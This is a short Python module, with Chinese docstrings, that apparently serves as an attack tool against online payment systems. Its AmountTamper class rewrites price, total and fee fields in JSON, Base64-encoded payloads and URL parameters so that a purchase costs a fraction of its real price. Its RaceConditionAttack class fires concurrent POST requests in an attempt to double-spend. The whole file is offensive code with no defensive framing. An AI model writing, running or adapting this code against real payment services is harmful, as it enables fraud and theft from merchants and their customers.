#!/usr/bin/env python3
"""金额篡改攻击"""
import json
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, Any

class AmountTamper:
    """支付金额篡改"""

    def __init__(self):
        self.common_fields = ['amount', 'total', 'price', 'money', 'sum', 'value', 'fee']

    def tamper_json(self, payload: str, multiplier: float = 0.01) -> str:
        """篡改 JSON 中的金额"""
        try:
            data = json.loads(payload)
            self._modify_amount_recursive(data, multiplier)
            return json.dumps(data)
        except:
            return payload

    def _modify_amount_recursive(self, obj: Any, multiplier: float):
        """递归修改金额字段"""
        if isinstance(obj, dict):
            for key, value in obj.items():
                if any(field in key.lower() for field in self.common_fields):
                    if isinstance(value, (int, float)):
                        obj[key] = value * multiplier
                    elif isinstance(value, str) and value.replace('.', '').isdigit():
                        obj[key] = str(float(value) * multiplier)
                else:
                    self._modify_amount_recursive(value, multiplier)
        elif isinstance(obj, list):
            for item in obj:
                self._modify_amount_recursive(item, multiplier)

    def tamper_base64(self, payload: str, multiplier: float = 0.01) -> str:
        """篡改 Base64 编码的金额"""
        try:
            decoded = base64.b64decode(payload).decode()
            tampered = self.tamper_json(decoded, multiplier)
            return base64.b64encode(tampered.encode()).decode()
        except:
            return payload

    def tamper_url_param(self, url: str, param: str, new_value: str) -> str:
        """篡改 URL 参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param in params:
            params[param] = [new_value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def generate_price_confusion(self, amount: float) -> Dict[str, float]:
        """生成价格混淆"""
        return {
            'display': amount,
            'actual': amount * 0.01,
            'currency': 'CNY',
            'precision_error': amount * 100,
        }

class RaceConditionAttack:
    """竞态条件攻击"""

    @staticmethod
    async def double_spend(session, url: str, payload: Dict, count: int = 5):
        """并发发送多次请求"""
        import asyncio
        tasks = []
        for i in range(count):
            task = session.post(url, json={**payload, "nonce": i})
            tasks.append(task)
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        return responses
